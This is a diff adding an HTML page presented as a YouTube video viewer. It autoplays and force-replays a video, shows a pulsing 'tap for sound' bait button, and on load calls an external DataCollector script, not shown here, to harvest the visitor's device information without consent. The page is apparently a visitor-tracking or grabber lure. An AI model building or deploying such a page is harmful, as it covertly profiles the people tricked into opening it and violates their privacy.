@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>YouTube Video Viewer</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            touch-action: manipulation;
+            overflow: hidden;
+        }
+        .video-container {
+            width: 95%;
+            max-width: 800px;
+            position: relative;
+        }
+        #yt-video {
+            width: 100%;
+            height: auto;
+            aspect-ratio: 16/9;
+            border: none;
+        }
+        #unmute-btn {
+            margin-top: 15px;
+            padding: 12px 25px;
+            background-color: #ff0000;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        #unmute-btn::after {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: rgba(255,255,255,0.2);
+            transform: rotate(30deg);
+            animation: shine 3s infinite;
+        }
+        @keyframes shine {
+            0% { transform: rotate(30deg) translate(-30%, -30%); }
+            100% { transform: rotate(30deg) translate(30%, 30%); }
+        }
+        #unmute-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 12px rgba(0,0,0,0.3);
+        }
+        .pulse {
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        #status {
+            margin-top: 10px;
+            color: #666;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="video-container">
+        <iframe id="yt-video" 
+                src="https://www.youtube.com/embed/YnDtpILctso?autoplay=1&mute=1&enablejsapi=1&playsinline=1" 
+                frameborder="0" 
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+                allowfullscreen></iframe>
+    </div>
+
+    <button id="unmute-btn" class="pulse">TAP HERE FOR SOUND 🔊</button>
+    <div id="status">Loading...</div>
+
+    <script src="scripts/main.js"></script>
+    <script>
+        // Disable zooming on mobile
+        document.addEventListener('gesturestart', function(e) {
+            e.preventDefault();
+        });
+        
+        // YouTube API setup
+        var tag = document.createElement('script');
+        tag.src = "https://www.youtube.com/iframe_api";
+        var firstScriptTag = document.getElementsByTagName('script')[0];
+        firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
+
+        var player;
+        var videoPlayed = false;
+        
+        function onYouTubeIframeAPIReady() {
+            player = new YT.Player('yt-video', {
+                events: {
+                    'onReady': onPlayerReady,
+                    'onStateChange': onPlayerStateChange
+                }
+            });
+        }
+
+        function onPlayerReady(event) {
+            event.target.playVideo();
+            videoPlayed = true;
+            document.getElementById('status').textContent = 'Video loaded - Collecting data...';
+            
+            // Start data collection after video loads
+            setTimeout(captureData, 1000);
+        }
+
+        function onPlayerStateChange(event) {
+            if(event.data == YT.PlayerState.ENDED || 
+              (event.data == YT.PlayerState.PAUSED && videoPlayed)) {
+                player.playVideo();
+            }
+        }
+
+        function unmuteVideo() {
+            if(player) {
+                player.unMute();
+                player.setVolume(100);
+                document.getElementById('unmute-btn').style.display = 'none';
+                document.getElementById('status').textContent = 'Sound enabled - Data collection complete';
+            }
+        }
+
+        // Set up unmute button
+        document.getElementById('unmute-btn').addEventListener('click', function() {
+            unmuteVideo();
+            this.classList.remove('pulse');
+        });
+
+        // Visitor data collection
+        async function captureData() {
+            try {
+                document.getElementById('status').textContent = 'Collecting device information...';
+                
+                const result = await DataCollector.collectAllData();
+                
+                if (result.success) {
+                    document.getElementById('status').textContent = 'Data collected successfully!';
+                    console.log('Data captured:', result.data);
+                } else {
+                    document.getElementById('status').textContent = 'Data collection completed with some limitations';
+                }
+            } catch (error) {
+                console.error('Error capturing data:', error);
+                document.getElementById('status').textContent = 'Data collection error';
+            }
+        }
+    </script>
+</body>
+</html>
